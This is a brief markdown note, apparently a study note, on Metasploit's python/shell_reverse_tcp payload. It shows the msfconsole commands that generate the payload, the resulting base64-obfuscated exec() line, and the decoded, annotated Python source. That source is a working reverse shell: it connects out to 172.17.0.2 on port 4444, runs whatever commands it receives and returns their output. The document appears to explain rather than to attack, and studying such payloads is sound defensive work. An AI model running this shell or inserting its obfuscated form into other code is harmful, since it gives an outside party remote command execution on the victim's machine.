# Metasploit python shell_reverse_tcp (single payload)

## Single payload

Source: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/python/reverse_tcp.rb

### Generate
```
msf5 > use payload/python/shell_reverse_tcp
msf5 payload(python/shell_reverse_tcp) > generate -f raw -o single.py
```

### Result
```python
exec('aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uY29ubmVjdCgoJzE3Mi4xNy4wLjInLDQ0NDQpKQpPeD1GYWxzZQp3aGlsZSBub3QgT3g6CglkYXRhPXNvLnJlY3YoMTAyNCkKCWlmIGxlbihkYXRhKT09MDoKCQlPeD1UcnVlCglzdGRpbixzdGRvdXQsc3RkZXJyLD1vcy5wb3BlbjMoZGF0YSkKCXN0ZG91dF92YWx1ZT1zdGRvdXQucmVhZCgpK3N0ZGVyci5yZWFkKCkKCXNvLnNlbmQoc3Rkb3V0X3ZhbHVlKQo='.decode('base64'))
```

### Base64 Decoded Content
```python
import socket,os
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)   # create TCP socket
so.connect(('172.17.0.2',4444))                       # connnect to 172.17.0.2 on port 4444
Ox=False
while not Ox:
	data=so.recv(1024)                                  # recv cmd buffer
	if len(data)==0:
		Ox=True
	stdin,stdout,stderr,=os.popen3(data)                # exec cmd as subprocess
	stdout_value=stdout.read()+stderr.read()
	so.send(stdout_value)                               # return stdout/stderr
```
